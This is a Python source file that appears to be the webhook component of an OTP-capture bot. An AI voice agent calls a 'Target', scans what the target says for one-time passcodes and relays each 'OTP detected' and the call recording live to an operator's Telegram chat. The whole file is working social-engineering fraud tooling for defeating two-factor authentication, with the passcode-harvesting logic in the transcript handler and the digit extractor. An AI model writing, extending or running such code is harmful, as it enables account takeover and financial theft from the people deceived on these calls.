import json
import logging
import os
import re
import threading
from datetime import datetime
from typing import Optional

import requests
from flask import Response

logger = logging.getLogger(__name__)


def extract_otp_from_transcript(text: str, code_length: int = 6) -> Optional[str]:
    if not text:
        return None
    patterns = [
        rf"\b(\d{{{code_length}}})\b",
        rf"(\d\s?){{{code_length}}}",
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            raw = match.group(1) if match.lastindex else match.group(0)
            digits = re.sub(r"\s+", "", raw)
            if len(digits) == code_length and digits.isdigit():
                return digits

    all_digits = re.sub(r"\s+", "", re.sub(r"[^\d\s]", "", text))
    for i in range(len(all_digits) - code_length + 1):
        candidate = all_digits[i:i + code_length]
        if len(candidate) == code_length and candidate.isdigit():
            return candidate
    return None


def _send_telegram(chat_id: int, text: str, **kwargs):
    if not chat_id:
        return
    try:
        from handlers.otp_notifier import _bot_instance
        if _bot_instance:
            _bot_instance.send_message(chat_id, text, **kwargs)
        else:
            import telebot
            token = os.getenv("BOT_TOKEN", "")
            if token and token != "YOUR_BOT_TOKEN_HERE":
                tb = telebot.TeleBot(token)
                tb.send_message(chat_id, text, **kwargs)
    except Exception as e:
        logger.warning("Failed to send Telegram message to %s: %s", chat_id, e)


def _send_live_status(chat_id, text: str, **kwargs) -> None:
    if not chat_id:
        return
    _send_telegram(int(chat_id), text, **kwargs)


def handle_vapi_webhook(request) -> Response:
    try:
        payload = request.get_json(force=True, silent=True)
        if not payload:
            return Response("Invalid payload", status=400)

        event_type = payload.get("type") or payload.get("event") or payload.get("message", {}).get("type")
        call_data = payload.get("call") or payload.get("message", {}).get("call", {})
        vapi_call_id = call_data.get("id") or payload.get("callId")
        call_sid = call_data.get("twilioCallSid") or call_data.get("phoneCallProviderId")

        metadata = payload.get("metadata") or {}
        chat_id = metadata.get("chat_id")

        logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s chat_id=%s", event_type, vapi_call_id, call_sid, chat_id)

        if event_type in ("call.started", "call.ringing"):
            _send_live_status(chat_id, "📞 Call started. Waiting for the line to connect...")
            return Response("OK")

        if event_type == "call.answered":
            _send_live_status(chat_id, "☎️ Target answered. AI assistant is now speaking...")
            return Response("OK")

        if event_type in ("call.in-progress", "call.in_progress"):
            _send_live_status(chat_id, "⏳ Call in progress. Conversation is ongoing...")
            return Response("OK")

        if event_type in ("transcript", "transcription", "call.transcript"):
            return _handle_transcript(payload, call_sid, vapi_call_id)

        if event_type in ("call.ended", "call.completed"):
            return _handle_call_ended(payload, call_sid, vapi_call_id)

        if event_type in ("recording.ready", "recording"):
            return _handle_recording(payload, call_sid, vapi_call_id)

        return Response("OK")

    except Exception as e:
        logger.error("[VAPI_WEBHOOK_ERROR] %s", e, exc_info=True)
        return Response("Error", status=500)


def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
    try:
        message = payload.get("message", payload)
        transcript_text = (
            message.get("transcript")
            or message.get("text")
            or message.get("transcription")
            or ""
        )
        role = message.get("role", "assistant")

        metadata = payload.get("metadata") or {}
        code_length = int(metadata.get("code_length", 6))
        user_id = metadata.get("user_id")
        chat_id = metadata.get("chat_id")

        if transcript_text:
            if role == "customer":
                _send_live_status(chat_id, f"👤 Target: {transcript_text}")
            else:
                _send_live_status(chat_id, f"💬 AI: {transcript_text}")

        if role == "customer" and transcript_text:
            otp = extract_otp_from_transcript(transcript_text, code_length)
            if otp:
                logger.info("[VAPI_OTP_DETECTED] otp=%s call_sid=%s", otp, call_sid)
                _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
                if chat_id and call_sid:
                    from handlers.otp_notifier import notify_otp_captured
                    notify_otp_captured(
                        chat_id=int(chat_id),
                        call_sid=call_sid,
                        user_id=user_id or "unknown",
                        digits=otp,
                        vapi_call_id=vapi_call_id,
                    )
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_TRANSCRIPT_ERROR] %s", e)
        return Response("OK")


def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
    try:
        call_data = payload.get("call", payload)
        duration_ms = call_data.get("durationMs") or 0
        duration_s = round(duration_ms / 1000) if duration_ms else 0
        status = call_data.get("status", "completed")

        logger.info("[VAPI_CALL_ENDED] call_sid=%s duration=%ss status=%s", call_sid, duration_s, status)

        metadata = payload.get("metadata") or {}
        chat_id = metadata.get("chat_id")
        user_id = metadata.get("user_id")

        if chat_id:
            from bot import send_call_complete_menu
            if status == "completed":
                _send_live_status(chat_id, f"✅ Call ended. Duration: {duration_s}s")
            elif status == "failed":
                _send_live_status(chat_id, "❌ Call failed.")
            elif status == "no-answer":
                _send_live_status(chat_id, "⏱️ No answer.")
            elif status == "busy":
                _send_live_status(chat_id, "ℹ️ Line busy.")
            elif status == "canceled":
                _send_live_status(chat_id, "ℹ️ Call canceled.")
            else:
                _send_live_status(chat_id, f"📞 Call ended. Status: {status}")
            try:
                send_call_complete_menu(int(chat_id))
            except Exception:
                pass

        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_CALL_ENDED_ERROR] %s", e)
        return Response("OK")


def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
    try:
        recording_url = (
            payload.get("recordingUrl")
            or payload.get("message", {}).get("recordingUrl")
            or payload.get("call", {}).get("recordingUrl")
        )
        if not recording_url:
            logger.info("[VAPI_RECORDING] no recordingUrl in payload")
            return Response("OK")

        metadata = payload.get("metadata") or {}
        chat_id = metadata.get("chat_id")
        user_id = metadata.get("user_id")

        logger.info("[VAPI_RECORDING] url=%s chat_id=%s user_id=%s", recording_url[:80], chat_id, user_id)

        def _download_and_send():
            try:
                resp = requests.get(recording_url, timeout=60)
                if resp.status_code != 200:
                    logger.warning("[VAPI_RECORDING] download failed status=%s", resp.status_code)
                    if chat_id:
                        _send_telegram(chat_id, "⚠️ Recording could not be downloaded.")
                    return

                from bot import send_call_complete_menu
                audio_data = resp.content

                if user_id:
                    from core.files import ensure_user_path, user_conf_path
                    ensure_user_path(user_id)
                    ext = ".wav"
                    if "content-type" in resp.headers:
                        ct = resp.headers["content-type"]
                        if "mp3" in ct:
                            ext = ".mp3"
                        elif "ogg" in ct:
                            ext = ".ogg"
                    file_path = str(user_conf_path(user_id) / f"recording{ext}")
                    with open(file_path, "wb") as f:
                        f.write(audio_data)
                    logger.info("[VAPI_RECORDING] saved to %s", file_path)

                if chat_id:
                    from handlers.otp_notifier import _bot_instance
                    import io
                    audio_io = io.BytesIO(audio_data)
                    audio_io.name = f"recording_{call_sid or 'unknown'}.wav"
                    _send_live_status(chat_id, "🎙 Recording ready. Sending audio to Telegram...")
                    try:
                        if _bot_instance:
                            _bot_instance.send_audio(int(chat_id), audio_io, caption="📞 Call recording", timeout=30)
                        else:
                            import telebot
                            token = os.getenv("BOT_TOKEN", "")
                            if token and token != "YOUR_BOT_TOKEN_HERE":
                                tb = telebot.TeleBot(token)
                                tb.send_audio(int(chat_id), audio_io, caption="📞 Call recording", timeout=30)
                    except Exception as e:
                        logger.warning("[VAPI_RECORDING] failed to send audio: %s", e)
                        _send_telegram(chat_id, "✅ Call completed. Recording saved but could not send audio to chat.")
                    try:
                        send_call_complete_menu(int(chat_id))
                    except Exception:
                        pass

            except Exception as e:
                logger.error("[VAPI_RECORDING_DOWNLOAD_ERROR] %s", e)
                if chat_id:
                    _send_telegram(chat_id, "⚠️ Failed to download recording.")

        threading.Thread(target=_download_and_send, daemon=True).start()
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_RECORDING_ERROR] %s", e)
        return Response("OK")
